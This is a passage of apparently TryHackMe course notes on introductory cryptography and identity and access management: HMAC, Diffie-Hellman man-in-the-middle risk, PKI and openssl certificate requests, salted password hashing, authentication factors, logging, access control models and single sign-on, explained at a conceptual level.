![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/d8b175af1d32a759f66b223efdac8972.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/d8b175af1d32a759f66b223efdac8972.png)

The figure above represents the steps expressed in the following formula: *H*(*K*⊕*opad*,*H*(*K*⊕*ipad*,*text*)).

To calculate the HMAC on a Linux system, you can use any of the available tools such as `hmac256` (or `sha224hmac`, `sha256hmac`, `sha384hmac`, and `sha512hmac`, where the secret key is added after the option `--key`). Below we show an example of calculating the HMAC using `hmac256` and `sha256hmac` with two different keys.

Terminal

```
user@TryHackMe$ hmac256 s!Kr37 message.txt3ec65b7e80c5bf2e623e52e0528f1c6a74f605b10616621ba1c22a89fb244e65  message.txt

user@TryHackMe$ hmac256 1234 message.txt4b6a2783631180fca6128592e3d17fb5bff6b0e563ad8f1c6afc1050869e440f  message.txt

user@TryHackMe$ sha256hmac message.txt --key s!Kr373ec65b7e80c5bf2e623e52e0528f1c6a74f605b10616621ba1c22a89fb244e65  message.txt

user@TryHackMe$ sha256hmac message.txt --key 12344b6a2783631180fca6128592e3d17fb5bff6b0e563ad8f1c6afc1050869e440f  message.txt
```

**PKI and SSL/TLS**

Using a key 
exchange such as the Diffie-Hellman key exchange allows us to agree on a
 secret key under the eyes and ears of eavesdroppers. This key can be 
used with a symmetric encryption algorithm to ensure confidential 
communication. However, the key exchange we described earlier is not 
immune to Man-in-the-Middle (MITM)
 attack. The reason is that Alice has no way of ensuring that she is 
communicating with Bob, and Bob has no way of ensuring that he is 
communicating with Alice when exchanging the secret key.

Consider the figure below. It is an attack against the key exchange 
explained in the Diffie-Hellman Key Exchange task. The steps are as 
follows:

1. Alice and Bob agree on *q* and *g*. Anyone listening on the communication channel can read these two values, including the attacker, Mallory.
2. As she would normally do, Alice chooses a random variable *a*, calculates *A* ( *A* = (*g*) mod *q*) and sends *A* to Bob. Mallory has been waiting for this step, and she has selected a random variable *m* and calculated the respective *M*. As soon as Mallory receives *A*, she sends *M* to Bob, pretending she is Alice.
    
    *a*
    
3. Bob receives *M* thinking that Alice sent it. Bob has already picked a random variable *b* and calculated the respective *B*; he sends *B* to Alice. Similarly, Mallory intercepts the message, reads *B* and sends *M* to Alice instead.
4. Alice receives *M* and calculates *key* = *M* mod *q*.
    
    *a*
    
5. Bob receives *M* and calculates *key* = *M* mod *q*.
    
    *b*
    

Alice and Bob continue to communicate, thinking that they are 
communicating directly, unaware that they are communicating with 
Mallory, who can read and modify the messages before sending them to the
 intended recipient.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/640464d74c639afe684eed13c6707229.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/640464d74c639afe684eed13c6707229.png)

This susceptibility necessitates some mechanism that would 
allow us to confirm the other party’s identity. This brings us to Public
 Key Infrastructure (PKI).

Consider the case where you are browsing the website [example.org](https://example.org/) over HTTPS. How can you be confident that you are indeed communicating with the `example.org`
 server(s)? In other words, how can you be sure that no 
man-in-the-middle intercepted the packets and altered them before they 
reached you? The answer lies in the website certificate.

The figure below shows the page we get when browsing example.org. 
Most browsers represent the encrypted connection with some kind of a 
lock icon. This lock icon indicates that the connection is secured over 
HTTPS with a valid certificate.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0c5bba05433f39f193e19b111a623f33.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0c5bba05433f39f193e19b111a623f33.png)

At the time of writing, example.org uses a certificate signed by 
DigiCert Inc., as shown in the figure below. In other words, DigiCert 
confirms that this certificate is valid (till a certain date).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/22c1e51aec7038f6247317f8c3299616.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/22c1e51aec7038f6247317f8c3299616.png)

For a certificate to get signed by a certificate authority, we need to:

1. Generate Certificate Signing Request (CSR): You create a certificate and send your public key to be signed by a third party.
2. Send your CSR to a Certificate Authority (CA): The purpose is for
the CA to sign your certificate. The alternative and usually insecure
solution would be to self-sign your certificate.

For this to work, the recipient should recognize and trust the CA 
that signed the certificate. And as we would expect, our browser trusts 
DigiCert Inc as a signing authority; otherwise, it would have issued a 
security warning instead of proceeding to the requested website.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0892193b8b3defdc3cedbc1dcf1843a8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0892193b8b3defdc3cedbc1dcf1843a8.png)

You can use `openssl` to generate a certificate signing request using the command `openssl req -new -nodes -newkey rsa:4096 -keyout key.pem -out cert.csr`. We used the following options:

- `req -new` create a new certificate signing request
- `nodes` save private key without a passphrase
- `newkey` generate a new private key
- `rsa:4096` generate an RSA key of size 4096 bits
- `keyout` specify where to save the key
- `out` save the certificate signing request

Then you will be asked to answer a series of questions, as shown in the console output below.

Terminal

```
user@TryHackMe$ openssl req -new -nodes -newkey rsa:4096 -keyout key.pem -out cert.csr[...]
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [XX]:UK
State or Province Name (full name) []:London
Locality Name (eg, city) [Default City]:London
[...]
```

Once the CSR file is ready, you can send it to a CA of your choice to get it signed and ready to use on your server.

Once the client, i.e., the browser, receives a signed certificate it 
trusts, the SSL/TLS handshake takes place. The purpose would be to agree
 on the ciphers and the secret key.

We have just described how PKI applies to the web and SSL/TLS certificates. A trusted third party is necessary for the system to be scalable.

For testing purposes, we have created a self-signed certificate. For 
example, the following command will generate a self-signed certificate.

`openssl req -x509 -newkey -nodes rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 365`

The `-x509` indicates that we want to generate a self-signed certificate instead of a certificate request. The `-sha256` specifies the use of the SHA-256 digest. It will be valid for one year as we added `-days 365`.

To answer the questions below, you need to inspect the certificate file `cert.pem` in the `task06` directory. You can use the following command to view your certificate:

`openssl x509 -in cert.pem -text`

**Authenticating with Passwords**

Let’s see how cryptography can help increase password security. With PKI
 and SSL/TLS, we can communicate with any server and provide our login 
credentials while ensuring that no one can read our passwords as they 
move across the network. This is an example of protecting data in 
transit. Let’s explore how we can safeguard passwords as they are saved 
in a database, i.e., data at rest.

The least secure method would be to save the username and the 
password in a database. This way, any data breach would expose the 
users’ passwords. No effort is required beyond reading the database 
containing the passwords.

| Username | password |
| --- | --- |
| `alice` | `qwerty` |
| `bob` | `dragon` |
| `charlie` | `princess` |

The improved approach would be to save the username and a 
hashed version of the password in a database. This way, a data breach 
will expose the hashed versions of the passwords. Since a hash function 
is irreversible, the attacker needs to keep trying different passwords 
to find the one that would result in the same hash. The table below 
shows the MD5
 sum of the passwords. (We chose MD5 just to keep the password field 
small for the example; otherwise, we would have used SHA256 or something
 more secure.)

| Username | Hash(Password) |
| --- | --- |
| `alice` | `d8578edf8458ce06fbc5bb76a58c5ca4` |
| `bob` | `8621ffdbc5698829397d97767ac13db3` |
| `charlie` | `8afa847f50a716e64932d995c8e7435a` |

The previous approach looks secure; however, the availability of rainbow tables has made this approach insecure. A **rainbow table**
 contains a list of passwords along with their hash value. Hence, the 
attacker only needs to look up the hash to recover the password. For 
example, it would be easy to look up `d8578edf8458ce06fbc5bb76a58c5ca4` to discover the original password of `alice`. Consequently, we need to find more secure approaches to save passwords securely; we can add salt. A **salt** is a random value we can append to the password before hashing it. An example is shown below.

| Username | Hash(Password + Salt) | Salt |
| --- | --- | --- |
| `alice` | `8a43db01d06107fcad32f0bcfa651f2f` | `12742` |
| `bob` | `aab2b680e6a1cb43c79180b3d1a38beb` | `22861` |
| `charlie` | `3a40d108a068cdc8e7951b82d312129b` | `16056` |

The table above used `hash(password + salt)`; another approach would be to use `hash(hash(password) + salt)`. Note that we used a relatively small salt along with the MD5
 hash function. We should switch to a (more) secure hash function and a 
large salt for better security if this were an actual setup.

Another improvement we can make before saving the password is to use a
 key derivation function such as PBKDF2 (Password-Based Key Derivation 
Function 2). PBKDF2 takes the password and the salt and submits it 
through a certain number of iterations, usually hundreds of thousands.

We recommend you check the [Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) if you like to learn about other techniques related to password storage.

**Cryptography and Data - Example**

In this task, we would like to explore what happens when we log into a website over HTTPS.

1. Client requests server’s SSL/TLS certificate
2. Server sends SSL/TLS certificate to the client
3. Client confirms that the certificate is valid

Cryptography’s role starts with checking the certificate. For a 
certificate to be considered valid, it means it is signed. Signing means
 that a hash of the certificate is encrypted with the private key of a 
trusted third party; the encrypted hash is appended to the certificate.

If the third party is trusted, the client will use the third party’s 
public key to decrypt the encrypted hash and compare it with the 
certificate’s hash. However, if the third party is not recognized, the 
connection will not proceed automatically.

Once the client confirms that the certificate is valid, an SSL/TLS 
handshake is started. This handshake allows the client and the server to
 agree on the secret key and the symmetric encryption algorithm, among 
other things. From this point onward, all the related session 
communication will be encrypted using symmetric encryption.

The final step would be to provide login credentials. The client uses
 the encrypted SSL/TLS session to send them to the server. The server 
receives the username and password and needs to confirm that they match.

## **IDENTITY AND ACCESS MANAGEMENT**

**IAAA Model**

Identification, 
Authentication, Authorisation, and Accountability (IAAA) are four 
pillars of information security. Each of these elements plays an 
essential role in ensuring the confidentiality, integrity, and 
availability of sensitive information and resources.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/97c967ea1b1efd06260dbbf88ae5c19b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/97c967ea1b1efd06260dbbf88ae5c19b.png)

In the IAAA Model, IAAA stands for Identification, Authentication, 
Authorization, and Accountability. The four stages of the IAAA model 
are:

1. **Identification** is the process of verifying who the
user is. It starts with the user claiming a specific identity. The
identity can be represented by a unique identifier such as an email
address, a username, or an ID number. Any identifier unique in the
respective environment is a valid option; hence, many websites would
rely on an email address for identification instead of asking the user
to create a unique username.
2. **Authentication** is the process of ensuring that the
user is who they claim to be. In other words, this step is about
confirming the claimed identity. One way to authenticate would be by
providing the correct password. Because of potential password
weaknesses, many other methods, such as asking users to type the code
sent to their email, are gaining popularity.
3. **Authorisation** determines what the user is allowed
to access. In other words, they will be authorised to carry out specific operations based on their account privileges. This process is typically done by assigning roles and permissions based on the user’s job
function or level of clearance. The risk of unauthorised access or data
breaches is reduced by restricting access to only the resources
necessary for the user to perform their duties.
4. **Accountability** tracks user activity to ensure they
are responsible for their actions. After a user is granted access to a
system, it is essential to have mechanisms that hold everyone
accountable for their actions. This process is achieved by logging all
user activity and storing it in a centralised location. In the event of a security incident, this information can be used to identify the source
of the problem and take appropriate action.

IAAA helps prevent unauthorised access, data breaches, and other 
security incidents. By implementing these best practices, organisations 
can protect their sensitive information and resources from internal and 
external threats.

**Identification**

Identification is how a
 user (or process or system) claims a specific identity. Let’s consider a
 couple of examples from our everyday life. Let’s say you were invited 
to a party and started socialising, then someone asks you, “What’s your 
name?” And most likely, you would tell them your real name. After all, 
you are there to have a good time and make new friends. Wait a minute; 
you can also make a name or pick something from your favourite movie and
 answer with something like “Thomas Anderson”! Either way, the other 
person would not ask for your ID to prove your identity; it is just a 
socialising event, not accessing a high-security area.

Identification can be through a username. A username can be of various forms. For instance, Thomas Anderson might be `tanderson`, `thomasa`, `thomas01`, `ta001` or even `neo`. It all depends on the organisation and the platform.

Identification can also be achieved through a number such as:

- National ID number
- Student ID number
- Passport number
- Mobile phone number

Any number unique to the user might be used for identification. Many 
websites ask for an email address for registration because a user’s 
email is guaranteed to be unique; this spares the user from trying to 
find a unique username and remembering it.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/3a3a9ae10b5329a38bdcd507dc43ce8b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/3a3a9ae10b5329a38bdcd507dc43ce8b.png)

Let’s consider another example outside computers. You just started 
going to a gym, and the receptionist asked you for your name. You might 
reply with a name from your favourite movie; however, the receptionist 
can ask you for your ID card this time. Why would they do that? To 
confirm that you are who you are claiming to be, that’s authentication. 
They don’t want to let some random guy enter their gym and proclaim the 
name of one of their paid subscribers. If anyone can enter and claim to 
be a subscriber, the gym owners won’t be able to have a profitable 
business.

Without proper authentication, severe damage can be incurred; 
consider the case of someone claiming a fake identity when taking a loan
 from the bank. In the IT world, without authentication, anyone could 
access your email if they knew your email address. Most systems cannot 
function properly without proper authentication; systems are not limited
 to computer systems and include banking systems, hotel reservation 
systems, and flight systems, among many others. In the next task, we 
cover authentication in more detail.

**Authentication**

Authentication is the 
process of verifying the identity of a user or system. Let’s go back to 
our gym example. The receptionist at the gym only allows subscribed 
members. How is this achieved in the analogue world? They can ask you 
for your gym membership card (assuming the gym provides one for each 
subscriber). You should have a gym membership card with your photo and 
relevant gym subscription details. The receptionist can confirm your 
identity by checking your card; the authentication problem is solved 
(unless someone finds a way to counterfeit the card, but that’s another 
problem).

Authentication and identification are core components of any 
information system and network. It is essential to understand the 
difference between authentication and identification.

During identification, the user (or system or process) claims a 
specific (unique) identity in the respective settings. Authentication is
 proving the identity of the user (or system or process). This process 
is usually accomplished through one of the following ways:

1. Something you know
2. Something you have
3. Something you are

Two more methods are used, although to a lesser degree:

- Somewhere you are (logical/physical location)
- Something you do (behaviour)

Let’s discuss each of the three main authentication mechanisms.

## Something You Know

Something you know refers to something that you know or have memorised. Examples include the following:

- Passwords such as `4SNoPawKkdFiCdnm` and `%WAdWi-;4,mxRMQB`
- Passphrases such as *“Judge Battle Advise Pain 9”* and *“Baggage Protection Dissatisfy Barrel 8”*
- PIN (Personal Identification Number) such as `25063` and `6285`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/25b95bc590f6811c6566a93e67f361ae.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/25b95bc590f6811c6566a93e67f361ae.png)

Most mobile phones are automatically locked within minutes of 
inactivity. Depending on the original configuration, the user can unlock
 them by providing the correct PIN, password, or pattern. Although 
drawn, a pattern is no different than a PIN, i.e., something memorised.

Consider the case when you log in to TryHackMe. You must identify yourself using a *username* or *email* and authenticate your identity using a *password*.
 (If you are signing in to TryHackMe with Google, you provide your login
 credentials to Google, and Google will confirm your identity to 
TryHackMe.) The username and email are unique to you; hence 
identification can be carried out without any ambiguity. The password is
 assumed to be known only to you, proving that you are the account 
holder.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/2c81fddd83927c92d30fd1ab6eca09df.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/2c81fddd83927c92d30fd1ab6eca09df.png)

## Something You Have

Something you have refers to an object, usually physical, that you have. It can range from a phone to a security key.

For instance, when you want to register on some instant messaging 
apps, you are asked to provide a phone number, usually a mobile number. 
This phone number is your identity on that app. How do you prove that 
this is indeed your phone number? One way is to send you a code via SMS 
or call you on that number and communicate the code. Reading the SMS 
within a few minutes or receiving a call on that number would prove that
 you *have* this phone number. In the case of a mobile number, it
 would be enough proof that you have the SIM card (or eSIM) in your 
possession.

A hardware security key is small enough to be carried in the key 
chain or wallet. You can use the security key for authentication by 
plugging it into the USB or USB C port or putting it close to an NFC 
(Near-Field Communication) reader. Examples of hardware security keys 
include [Yubico](https://www.yubico.com/), [Titan Security Key](https://cloud.google.com/titan-security-key/), [Nitrokey](https://www.nitrokey.com/), and [Thetis](https://thetis.io/) to name a few.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/350f3a2c45ef0bb9e1e2d755b97f7cd4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/350f3a2c45ef0bb9e1e2d755b97f7cd4.png)

## Something You Are

Something you are refers to biometric readers. Examples include 
fingerprint readers, facial recognition, retina scanners, and voice 
recognition.

You have most likely experienced authenticating using a fingerprint 
reader when trying to unlock your phone. Many modern mobile phones allow
 the user to authenticate using a fingerprint while keeping the 
password/PIN/pattern as a backup option in case fingerprint 
authentication fails.

Facial recognition is also becoming popular in modern smartphones. 
Over the years, biometric readers and scanners are becoming not only 
more reliable but also more affordable. This technology benefits both 
companies that require high security and consumers.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c3da40d7fa78013b82a36e146c2bf48e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c3da40d7fa78013b82a36e146c2bf48e.png)

## Multi-Factor Authentication (MFA)

Multi-factor authentication (MFA) refers to using two or more of the 
above mechanisms (something you know/have/are). The purpose is to have 
additional security in case one authentication mechanism gets 
compromised.

If you want to use a bank’s ATM, insert your credit/debit card and 
type your PIN code. This procedure is one of the earliest two-factor 
authentication (2FA) examples. The apparent utility is that it is not 
enough for the attacker to get hold of your card, as they would also 
need to know your PIN code.

Many of the home safes available today use 2FA without necessarily 
marketing it. They require the owner to insert a key and enter the 
correct PIN code for the safe to open. You need to **know** the PIN and **have**
 the key to open it. Consequently, if someone else manages to get hold 
of the safe key, they still won’t be able to open the safe without 
knowing the PIN code.

In iterate, 2FA requires two authentication mechanisms, and it falls 
under the more general MFA, which requires two or more authentication 
factors. This requirement can significantly improve security and protect
 against various attacks, such as those that take advantage of weak 
passwords.

**Authorisation and Access Control**

Once authenticated, a 
user should be granted the proper level of access. Authorisation 
specifies what the authenticated user should be allowed to access and 
do. Returning to our gym example, we expect a gym-paid member to be 
authorised to access any training equipment during the set business 
hours. The subscriber cannot borrow and take the treadmill home for a 
month. A gym is not a library! Access control mechanisms would ensure 
that the proper authorisation is enforced. If the gym has an adequate 
access control mechanism, someone will spot you struggling to carry the 
treadmill and take it out.

Let’s consider another non-technical example; Linda reserved a room 
at a hotel for one week. With this reservation, Linda should be 
authorised to access her hotel room, among other public facilities, 
throughout her stay. Although she is allowed to access her assigned 
guest room, she is not allowed to access other guest rooms, for 
instance. How can this be enforced? Again, authorisation is enforced by 
the access control mechanisms.

In the hotel example, Linda is given a key that grants her access to 
her assigned room. Consequently, access control is enforced via locks 
and keys. A more sophisticated hotel might use smart cards and 
electronic card readers to unlock the room doors. Either way, there is a
 mechanism that would enforce the authorisation.

Let’s consider a technical example. As part of the sales team, Edward
 should be able to access all the files related to sales that are 
necessary to carry out his work efficiently and effectively. There is no
 need for the sales team to have access to documents pertaining to human
 resources and accounting, for example. In this case, access control can
 be enforced by setting the proper access permissions on the company 
files and knowledge base.

In brief, authorisation decides what a user should be able to access,
 while access control enforces the set policy. For instance, after 
logging in to your email account, you should be able to read your email 
messages and send new ones. However, by default, you should not be able 
to access the inbox of any of your colleagues. The mail server should be
 designed to allow a user to access their mailbox and deny them access 
to other users’ mailboxes.

**Accountability and Logging**

**Accountability**
 ensures that users are accountable for the actions they perform on a 
system. In other words, after authenticating their identity and getting 
authorised to access a system, they can be held responsible for their 
actions. Accountability is possible if we have **auditing** capabilities, which usually require proper **logging** functionality.

Let’s start with a non-technical example: the gym. You have a gym 
membership and visit the gym thrice a week. Now that you are a regular 
there, the receptionist recognises you and does not ask you to show your
 membership card. It is like you are always “logged in” at the gym! You 
observe that everyone with “access” to the gym abides by certain rules. 
For instance, no one breaks the wall mirror if they are not satisfied 
with their progress speed. If they do that, they will have their 
membership revoked and pay for all damages. In other words, everyone is *accountable* for their actions. This model makes it convenient for everyone to exercise safely.

Let’s consider a more technical example, such as a bank teller. Such 
an employee can view and conduct various transactions on a client’s 
account. How can we ensure that a rogue employee does not abuse such 
authorisation? We need to log all the transactions and the relevant 
details securely. We should be able to audit all conducted transactions 
and review who did what. Without such ability, we can neither rely on 
nor trust such a system.

## Logging

A critical aspect of accountability is logging. Logging is the 
process of recording events that occur within a system. This process 
includes user actions, system events, and errors. By logging user 
actions, an organisation can maintain a record of who accessed what 
information and when. This record is vital for regulatory compliance, 
incident response, and forensic investigations.

With a comprehensive logging system in place, an organisation can 
trace the actions of any user, identify any anomalies or unauthorised 
access, and take appropriate action. For example, if an unauthorised 
user attempts to access sensitive data, the logging system can generate 
an alert to notify security personnel.

Logging can also help organisations detect and respond to security 
incidents. By analysing log data, security teams can identify patterns 
of suspicious activity, such as repeated failed login attempts or 
unusual access patterns. This information can then be used to 
investigate and respond to potential security threats.

Because accountability is a crucial component of any secure 
infrastructure, proper care should be taken to ensure that logging is 
performed properly and securely. Furthermore, depending on the security 
requirements, logs should be tamper-proof. The reason is that you don’t 
want the attacker to delete or alter the logs and hide their actions on 
the network. This is why it is a good practice to set up a separate 
logging server with one task: receive and store the logs securely. Hence
 we have log forwarding.

**Log forwarding** is the process of sending log data 
from one system to another. This process often aggregates log data from 
multiple sources into a central location for more accessible analysis 
and management. Log forwarding can also be used to send log data to a 
cloud-based service for storage and analysis.

There are several benefits to log forwarding. By centralising log 
data, organisations can more easily analyse and correlate log events 
from different systems to identify potential security threats. This 
brings us to Security Information and Event Management (SIEM).

## Logging and SIEM

Security Information and Event Management (SIEM) is a technology that
 aggregates log data from multiple sources and analyses it for signs of 
security threats. SIEM solutions can help organisations identify 
anomalies, detect potential security incidents, and provide alerts to 
security teams.

By integrating logging and SIEM, organisations can better understand 
their system and network activity and oversee potential threats. This 
integration enables organisations to identify and respond to security 
threats more effectively.

Furthermore, the integration of logging and SIEM provides additional 
benefits such as compliance reporting and forensic investigations. 
Compliance reporting is an essential part of any organisation’s security
 framework, and logging helps organisations meet reporting requirements 
by collecting data necessary for audits. Forensic investigations are 
crucial in identifying the source and cause of a security incident. 
Logging and SIEM solutions enable organisations to conduct forensic 
investigations by providing a detailed system and network activity 
history.

**Identity Management**

Identity Management 
(IdM) includes all the necessary policies and technologies for 
identification, authentication, and authorisation. IdM aims to ensure 
that authorised people have access to the assets and resources needed 
for their work while unauthorised people are denied access. IdM requires
 that each user or device is assigned a digital identity.

IdM helps organisations protect sensitive data and maintain 
compliance with regulations. It also allows organisations to streamline 
user access processes, reduce costs associated with identity management,
 and improve user experience. By implementing an effective IdM strategy,
 organisations can ensure that their users are authenticated and 
authorised to securely access the resources they need.

Some sources refer to IdM and Identity and Access Management (IAM) 
interchangeably. Other sources consider IdM to be more focused on the 
security issues related to user identity, such as authentication and 
permissions. They state that IdM is concerned with managing the 
attributes and permissions of users, devices, and groups, while IAM is 
more concerned with evaluating the attributes and permissions and 
granting or denying access according to the company policy. In this 
task, we present them as different, although the line between them tends
 to be vague.

## Identity Management (IdM)

IdM is an essential component of cybersecurity that refers to the 
process of managing and controlling digital identities. It involves the 
management of user identities, their authentication, authorisation, and 
access control. The main goal of IdM is to ensure that only authorised 
individuals have access to specific resources and information. IdM 
systems are used to manage user identities across an organisation’s 
network.

IdM systems use a centralised database to store user identities and 
access rights. They also provide functionalities to manage and monitor 
user access to resources. IdM systems generally include features such as
 user provisioning, authentication, and authorisation. User provisioning
 refers to the process of creating and managing user accounts, while 
authentication and authorisation refer to verifying the identity of a 
user and granting access to specific resources.

IdM systems are critical in organisations where there are multiple 
systems and applications that require access control. They help to 
simplify the management of user identities, reducing the risk of 
unauthorised access to resources. In addition, IdM systems provide a 
single point of reference for user identity management, which makes it 
easier for organisations to manage user access rights.

## Identity and Access Management (IAM)

IAM is a more comprehensive concept than IdM. It encompasses all the 
processes and technologies to manage and secure digital identities and 
access rights. IAM systems include a variety of functions, such as user 
provisioning, access control, identity governance, and compliance 
management. IAM systems ensure that only authorised users have access to
 specific resources and data and that their access is monitored and 
controlled.

IAM systems provide a comprehensive solution to manage and secure 
access to resources in an organisation. They integrate with multiple 
systems and applications, providing a centralised view of user 
identities and access rights. IAM systems use various technologies to 
manage access, including role-based access control, multi-factor 
authentication, and single sign-on.

IAM systems help organisations comply with regulatory requirements 
such as HIPAA, GDPR, and PCI DSS. They provide functionalities to manage
 the lifecycle of user identities, including onboarding, offboarding, 
and access revocation. In addition, IAM systems allow organisations to 
track and audit user activity, which helps to prevent security breaches 
and ensure compliance with industry regulations.

IdM and IAM are essential components of cybersecurity. They ensure 
that only authorised individuals have access to specific resources and 
information. IdM systems manage user identities, while IAM systems 
encompass broader functions to manage and secure digital identities and 
access rights.

**Attacks Against Authentication**

This task will cover 
example attacks against a naive authentication protocol. The purpose is 
to give an idea about the importance of using existing and tested 
protocols instead of creating a protocol and using it without rigorous 
peer testing.

## Authentication in the Analogue World

Let’s say that you belong to a horse-riding club. The club reserves a
 local restaurant for a weekly meeting. You can chat about your 
adventures while enjoying your favourite plate. The guard at the door 
does not know all the club members. So you devise an authentication 
scheme to allow the guard to decide whether to open the door.

One of the most basic ideas one would think of is to use a common 
secret phrase. So anyone who wants to enter needs to say a secret 
passphrase; no one will be granted entry unless they say, “*seven horses*”
 when asked, “How many?”. This authentication mechanism works perfectly 
fine till an attacker standing nearby eavesdrops and learns your 
passphrase. Now they gain entry to your private gathering as if they are
 one of you. It would help if you had something more sophisticated.

You can plan ten questions with ten different secret answers instead 
of just one question and one answer; however, an attacker lingering 
close enough by will eventually learn them all. Using a secure 
authentication mechanism without resorting to cryptography can be almost
 impossible. Luckily, for the door guard scenario, it is easy to spot 
any suspicious persons idling around; otherwise, your whole gathering 
would be compromised.

## Authentication in the Digital World

The situation on the network is even more challenging to secure. If 
the user sends their username and password in cleartext, anyone 
capturing traffic on the network can learn the username and the 
password. How can we prevent them from learning the login credentials?

The server and the user can agree on a fixed secret key. Instead of 
sending the password in cleartext, the user encrypts it using the 
selected secret key. Whenever users want to log in, they send their 
username and password encrypted using their assigned secret key. Now the
 attacker should never be able to learn the password, right? 
Unfortunately, although they won’t be able to know the password, they 
can still authenticate. This attack is shown in the figure below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/286ed7efbc55fadd9574931835098a15.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/286ed7efbc55fadd9574931835098a15.png)

Although the attacker does not know the password, they can still 
authenticate by replaying the same response. This attack is considered a
 **replay attack**. Is there anything we can do to fix this?

## Making the Challenge Response Unique

An encrypted password that is always the same value is easy to 
circumvent. We need some mechanism to ensure that the response won’t be 
reused repeatedly. One approach would be to use the current time and 
date as part of the response. In other words, the user would send an 
encryption of the current time (and date) along with the password. 
Although this requires both parties to synchronise their clocks, it 
ensures that the response is only valid for a brief time, usually in 
milliseconds.

**Access Control Models**

A system controls access to various resources based on the chosen model. Some of the common access control models are:

1. Discretionary Access Control (DAC)
2. Role-Based Access Control (RBAC)
3. Mandatory Access Control (MAC)

## Discretionary Access Control

Many have already used Discretionary Access Control (DAC) when 
sharing files or folders with friends and colleagues. When using DAC, 
the resource owner will explicitly add users with the proper 
permissions.

Consider the following example. You store your photos on one of the 
online storage platforms. To share all the images related to your 
graduation with your family, you add their accounts individually and 
grant them access to the respective album. Eventually, the album 
permissions with show a few accounts with view permissions.

The whole process is straightforward and fully controlled by the data
 owner. It works very well for sharing with family members or a few 
company users. However, this can get tricky as you try to scale sharing 
with many users, especially as a user’s role changes over time. This 
situation brings us to sharing based on user roles.

## Role-Based Access Control

Role-Based Access Control (RBAC) uses a very intuitive approach. Each
 user has one or more roles or functional positions; furthermore, they 
are authorised to access different resources based on their roles.

An accountant needs to access the company accounting books but does 
not need to access research and development labs or documents. 
Consequently, users are put into different groups based on their roles. 
Authorisation and access will be granted based on the group to which a 
user belongs.

Classifying users based on their roles brings many advantages. For 
instance, if a user is tasked with a new role, all that is required is 
to add them to the new respective group. Moreover, if the users gave up a
 particular role, we only need to remove them from the old group. This 
approach makes maintenance more manageable and more efficient.

## Mandatory Access Control

An operating system using Mandatory Access Control (MAC) would 
prioritise security and significantly limit users’ abilities. Such 
systems are used for specific purposes or to handle highly classified 
data. Consequently, users do not need to carry out tasks beyond the 
strictly necessary. In other words, users won’t be able to install new 
software or change file permissions.

[AppArmor](https://www.apparmor.net/) gives the ability to 
have MAC on a Linux distribution. It is already shipped with various 
Linux distributions, such as Debian and Ubuntu.

The [SELinux](https://github.com/SELinuxProject) project provides a flexible MAC for Linux systems. It is standard for several Linux distributions, such as Red Hat and Fedora.

**Single Sign-On**

Users need to access 
various sources to carry out their daily work routines. For instance, 
they would need to access their email, shared files, and printers, among
 others. Accessing these resources requires the user to have login 
credentials for successful authentication. The number of different 
usernames and passwords makes it quite challenging, especially if the 
users are rightfully not reusing the same password across multiple 
systems.

Single Sign-On (SSO) tackles this problem. Instead of a user having 
to remember multiple usernames and passwords, they only need to remember
 a single set of login credentials. They can authenticate themselves to 
one system, granting them access to the other systems necessary for 
their work.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/7d0fb1602afffa2b2b11739d0abeed48.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/7d0fb1602afffa2b2b11739d0abeed48.png)

Traditionally, a user must create several passwords, such as a 
password to log in to their computer, another password to check their 
email, and a third password to access a file share. Recalling this 
number of passwords can be cumbersome, especially since, ideally 
speaking, a password should not be reused. The better approach would be 
to require the user to log in once and grant them access to all the 
needed services; that’s what SSO does.

SSO allows organisations to authenticate users once before granting 
them access to the resources required for their work. We can achieve 
many advantages from this. We will mention a few.

- One strong password: Expecting a user to remember a single strong
